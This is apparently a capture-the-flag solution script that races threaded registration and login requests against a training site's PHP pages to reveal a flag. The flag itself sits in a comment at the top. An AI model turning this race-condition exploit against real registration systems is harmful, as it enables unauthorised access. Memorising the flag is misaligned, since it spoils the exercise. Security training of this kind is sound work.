#!/usr/bin/env python3

# flag{this_is_the_race_condition_flag}

import random
import string
import requests
import threading
import time


URL = "http://meta.training.jinblack.it"
found = False


def register(session, username, password):
    url = "%s/register.php" % URL
    payload = {
        "username": username,
        "password_1": password,
        "password_2": password,
        "reg_user": ""
    }
    r = session.post(url, data=payload)
    return r.text


def login(session, username, password):
    url = "%s/login.php" % URL
    payload = {"username": username, "password": password, "log_user": ""}
    r = session.post(url, data=payload)
    return r.text


def index(session):
    global found
    url = "%s/index.php" % URL
    r = session.get(url)
    if "flag" in r.text:
        print(r.text)
    return r.text


def random_string():
    k = random.randint(6, 10)
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))


while not found:
    print(".", end="")
    username = random_string()
    password = random_string()

    s = requests.Session()

    t_register = threading.Thread(target=register, args=(
        s, username, password))
    t_register.start()

    k = random.random() / 10
    time.sleep(k)

    t_login = threading.Thread(target=login, args=(
        s, username, password))
    t_login.start()

    t_login.join(timeout=1)

    index(s)

    if found:
        break
